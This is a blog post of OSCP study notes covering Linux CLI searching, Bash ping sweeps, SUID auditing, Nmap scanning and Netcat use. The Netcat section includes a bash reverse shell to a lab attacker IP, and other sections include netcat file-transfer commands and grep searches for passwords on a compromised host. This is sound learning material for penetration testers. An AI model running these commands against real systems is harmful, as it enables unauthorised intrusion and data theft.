---
layout: post
title: "OSCP Journey: Week 1 - Linux CLI Mastery, Bash Scripting, and Initial Reconnaissance"
date: 2026-02-11T10:00:00+03:00
categories:
  - OSCP Certification
tags:
  - oscp
  - linux
  - bash
  - networking
  - nmap
  - reconnaissance
author: muhammed
description: Week 1 of my OSCP preparation journey. Hands-on notes covering Linux command line fluency, Bash scripting for automation, permission audits (SUID/SGID), Netcat tricks, and active reconnaissance.
toc: true
pin: false
math: false
mermaid: true
permalink: /posts/OSCP-Journey-Week-1-Linux-Fundamentals/
---

## Overview

Starting the journey toward the **Offensive Security Certified Professional (OSCP)** is both exciting and slightly intimidating. When I began Week 1, my primary goal was not to jump straight into complex exploits, but to build solid muscle memory in the fundamentals: navigating Linux at the speed of thought, automating repetitive tasks with Bash, understanding file permissions inside and out, and mastering network reconnaissance.

If you cannot quickly parse command output with `grep`, `awk`, and `sed`, or if you stumble when inspecting SUID bits, trying to exploit boxes later on becomes twice as difficult.

Here are my compiled notes, practical examples, and core takeaways from Week 1.

---

## 1. Linux CLI Fluency & Text Manipulation

In penetration testing, you spend 90% of your time in a terminal. Speed comes from knowing how to combine simple tools through pipelines.

### File Finding & Pattern Matching

When searching a compromised target for sensitive files, passwords, or configuration keys:

```bash
# Find files by name case-insensitively
find / -type f -iname "*config*" 2>/dev/null

# Find files modified in the last 24 hours
find / -mtime -1 -type f 2>/dev/null

# Search recursively for passwords inside text files while ignoring binary noise
grep -rnI "password" /var/www/ 2>/dev/null

# Extract only unique IP addresses from a web server access log
awk '{print $1}' access.log | sort -u
```

### Stream Redirection Cheat Sheet

Understanding file descriptors is critical when redirecting reverse shells or quieting terminal errors:
- `>` overwrites stdout to a file.
- `>>` appends stdout to a file.
- `2>` redirects stderr (used with `/dev/null` to silence access denied errors).
- `&>` or `2>&1` redirects both stdout and stderr together.
- `|` pipes stdout of one program into stdin of the next.

```bash
# Silencing permission errors while searching root folders
find / -perm -4000 2>/dev/null
```

---

## 2. Bash Scripting for Penetration Testers

Manual repetitive tasks waste time. Week 1 focused on writing clean, modular Bash scripts to automate simple enumeration tasks.

### Practical Pattern: The One-Liner Subdomain / Host Sweeper

Here is a quick ping sweeper I wrote to identify live hosts on a `/24` subnet without needing Nmap:

```bash
#!/bin/bash
# Simple ping sweeper
SUBNET="10.10.10"

echo "[*] Scanning subnet ${SUBNET}.0/24 for live hosts..."
for ip in $(seq 1 254); do
    ping -c 1 -W 1 "${SUBNET}.${ip}" | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
wait
echo "[+] Scan completed."
```

### Key Scripting Takeaways:
1. Always include a shebang (`#!/bin/bash`).
2. Quote your variables (`"${VAR}"`) to prevent unexpected word splitting or globbing bugs.
3. Use `$(command)` for modern command substitution rather than legacy backticks.
4. Run background jobs with `&` and call `wait` to make multi-host sweeps fast.

---

## 3. Linux File Permissions & Privilege Auditing

File permissions are the primary security boundary on Linux systems. Many privilege escalation vectors stem from misconfigured permissions.

```text
- rwx r-x r--
  ─── ─── ───
   │   │   └─ Other permissions (Read only)
   │   └───── Group permissions (Read & Execute)
   └───────── User/Owner permissions (Read, Write, Execute)
```

### SUID, SGID, and the Sticky Bit

Beyond basic `rwx` permissions, Linux provides special permission bits:

1. **SUID (Set User ID, 4000):** Executes the binary with the permissions of the file owner rather than the executing user. If owned by `root`, the binary runs as root!
   ```bash
   chmod u+s /path/to/binary
   ```
2. **SGID (Set Group ID, 2000):** Executes with the group permissions of the file owner, or enforces group inheritance in directories.
   ```bash
   chmod g+s /path/to/directory
   ```
3. **Sticky Bit (1000):** Only the file owner or root can delete files within the directory (used on `/tmp`).
   ```bash
   chmod +t /tmp
   ```

### Hunting for Dangerous SUID Binaries:

During an assessment, always scan for unexpected SUID binaries and cross-reference them with [GTFOBins](https://gtfobins.github.io/):

```bash
find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null
```

---

## 4. Networking Fundamentals & Netcat

Netcat is known as the "Swiss Army Knife" of networking. Here are the core patterns practiced this week:

### 1. Banner Grabbing & Manual Port Interaction
```bash
# Grab an HTTP server banner manually
nc -vn 10.10.10.10 80
HEAD / HTTP/1.0

# Connect to an SMTP server
nc -vn 10.10.10.10 25
HELO test.com
```

### 2. Setting Up Listeners & Reverse Shells
```bash
# Start a listening port on attack machine
nc -lvnp 4444

# Classic bash reverse shell from victim
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### 3. File Transfer via Netcat
When SSH, SCP, or HTTP servers are unavailable:

```bash
# On receiving machine:
nc -lvnp 9001 > received_file.tar.gz

# On sending machine:
nc -vn 10.10.14.5 9001 < file.tar.gz
```

---

## 5. Active & Passive Information Gathering

Reconnaissance sets the stage for everything that follows. Information gathering is divided into passive and active methods.

### Passive Reconnaissance
Gathering information without sending packets directly to the target systems:
- **WHOIS Queries:** Query domain registrar records to find organization names, registrant emails, and DNS name servers.
- **Search Engine Dorking (Google Hacking):**
  - `site:target.com filetype:pdf "confidential"`
  - `site:target.com inurl:admin`
  - `site:target.com intitle:"index of"`
- **DNS Enumeration:** Discovering MX, TXT (SPF records), and NS records via `dig` or `nslookup`:
  ```bash
  dig target.com ANY +noall +answer
  ```

### Active Reconnaissance (Nmap Scanning Strategy)

When scanning a target machine, I follow a two-pass Nmap strategy:

```bash
# Pass 1: Fast full-port sweep to discover all open TCP ports
sudo nmap -p- --min-rate 1000 -T4 -oN nmap_all_ports.txt 10.10.10.10

# Pass 2: Targeted deep scan on only the discovered open ports
sudo nmap -sC -sV -p 22,80,443,8080 -oN nmap_detailed.txt 10.10.10.10
```

This two-pass workflow ensures you never miss non-standard ports (like SSH on port 2222 or HTTP on port 8888) while keeping scan times down.

---

## 6. Personal Reflections & Next Steps

Week 1 reinforced that solid basics make complex challenges accessible. When you understand how Linux handles permissions, environment variables, and stream redirection, you are not just blindly running commands; you understand why they work.

### Goals for Week 2:
- Deep dive into service enumeration: SMB, SNMP, and NFS.
- Vulnerability scanning workflows.
- Web application reconnaissance and directory fuzzing with Feroxbuster and Gobuster.

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
